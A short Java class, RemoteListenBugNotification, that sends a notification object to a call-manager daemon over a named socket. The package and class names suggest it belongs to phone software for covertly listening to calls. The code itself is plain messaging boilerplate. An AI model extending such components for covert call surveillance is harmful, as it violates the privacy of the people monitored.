package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.BugNotification;

public class RemoteListenBugNotification extends SocketCmd<BugNotification, Boolean> {
	
	private static final long serialVersionUID = -5010910225268803981L;
	
	private static final String TAG = "RemoteListenBugNotification";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	/**
	 * This command supports updating the notification object
	 * @param notification
	 */
	public RemoteListenBugNotification(BugNotification notification) {
		super(notification, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
